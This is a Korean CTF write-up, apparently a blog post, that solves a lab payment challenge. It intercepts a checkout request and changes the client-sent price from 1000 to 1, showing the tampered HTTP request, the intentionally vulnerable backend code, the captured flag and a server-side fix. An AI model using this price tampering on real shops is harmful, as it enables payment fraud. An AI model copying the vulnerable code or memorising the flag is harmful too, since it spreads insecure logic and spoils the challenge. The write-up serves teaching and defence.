+++
title = "VulnABLE CTF [LUXORA] Write-up: Payment Manipulation 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Payment", "Bronze", "Parameter Tampering", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Payment Manipulation 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Logic & Business Layer (Payment Manipulation)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/payment/bronze`
- **목표**: 결제(Checkout)를 진행할 때, 클라이언트가 보내는 '상품 가격' 파라미터를 그대로 신뢰하는 취약점을 이용하여 1000달러짜리 플래그 상품을 단 1달러에 구매하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/payment/bronze` 장바구니 페이지에는 "Flag Premium (Price: $1000)" 이라는 상품이 있습니다.
현재 내 잔액은 $10 뿐입니다. 결제 버튼을 누르면 당연히 잔액 부족 에러가 뜹니다.

**[정상 결제 요청 패킷]**
```http
POST /payment/bronze/checkout HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Cookie: session=user_token

item_id=999&item_name=Flag+Premium&price=1000
```

**[해커의 사고 과정]**
1. 결제 폼에서 `item_id`만 보내는 게 아니라 `price=1000` 이라는 가격 정보를 같이 서버로 보내고 있다.
2. 서버는 이 상품의 원래 가격을 데이터베이스에서 확인하지 않고, 내가 폼으로 올려보낸 `price` 파라미터 값을 그대로 결제 금액으로 사용할 가능성이 있다.
3. 이 가격을 내가 살 수 있는 금액인 `1` 로 바꿔서 보내보자!

---

## 💥 2. 취약점 식별 및 파라미터 조작 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Price: $1)--> [ Web Server ]
                              |-- Trusts Client Price
                              |-- Deducts $1
                              |-- Item Purchased!
```


이른바 **Price Tampering (가격 조작)** 공격입니다. 가장 초보적인 형태의 결제 취약점이지만 놀랍게도 여전히 영세한 쇼핑몰에서 종종 발견됩니다.

### 💡 가격 조작 (Tampering)
Burp Suite의 Proxy 기능(Intercept)을 켜고 [Checkout] 버튼을 누릅니다.
가로챈 패킷에서 `price` 값을 `1` 로 수정합니다.

**[조작된 HTTP 패킷]**
```http
POST /payment/bronze/checkout HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Cookie: session=user_token

item_id=999&item_name=Flag+Premium&price=1
```

---

## 🚀 3. 공격 수행 및 결과 확인

조작된 패킷을 Forward 하여 서버로 보냅니다.

### 🔍 서버 내부의 동작
서버는 파라미터로 넘어온 값을 의심 없이 수용합니다.
```javascript
// 취약한 백엔드 로직
let userBalance = 10;
let checkoutPrice = parseInt(req.body.price); // 1

if (userBalance >= checkoutPrice) {
    userBalance -= checkoutPrice; // 10 - 1 = 9
    deliverItem(req.body.item_id);
}
```

### 🔍 조작된 서버의 응답
내 잔액은 9달러가 남았고, 결제가 성공적으로 승인되어 플래그가 나타납니다!

```html
HTTP/1.1 200 OK

<div class="success">
  <h2>Payment Successful!</h2>
  <p>You paid $1 for "Flag Premium".</p>
  <p class="flag">FLAG{PAYMENT_🥉_PRICE_TAMPERING_A1B2C3}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

결제 금액과 같은 핵심 비즈니스 데이터를 클라이언트의 입력(Hidden Input 등)에 의존했을 때 발생하는 가장 직관적이고 파괴적인 결제 조작을 성공시켰습니다.

**🔥 획득한 플래그:**
`FLAG{PAYMENT_🥉_PRICE_TAMPERING_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
결제 금액을 프론트엔드(클라이언트)가 정하게 내버려 둔 것이 원인입니다. 클라이언트 환경은 완벽하게 해커가 통제할 수 있는 영역(Zero Trust Zone)입니다.

* **안전한 패치 가이드 (Source of Truth 변경)**
클라이언트로부터는 오직 "어떤 상품을 샀는가(`item_id`)" 와 "몇 개를 샀는가(`quantity`)" 만 받아야 합니다. 가격 정보는 무조건 서버의 데이터베이스(DB)에서 직접 조회하여 계산해야 합니다.

```javascript
// 안전한 백엔드 결제 로직 예시
const itemId = req.body.item_id;
const qty = parseInt(req.body.quantity) || 1;

// 1. 가격은 클라이언트가 보낸 값이 아니라 DB에서 무조건 새로 조회함
const item = await db.query("SELECT price FROM products WHERE id = ?", [itemId]);
const actualPrice = item.price;

// 2. 서버 측에서 총액 계산
const totalToPay = actualPrice * qty;

if (user.balance >= totalToPay) {
    user.balance -= totalToPay;
    // 결제 승인
}
```
이렇게 수정하면 해커가 `price=1` 을 아무리 조작해서 보내도, 서버는 그 파라미터를 아예 무시(Ignore)하므로 가격 조작이 원천 차단됩니다.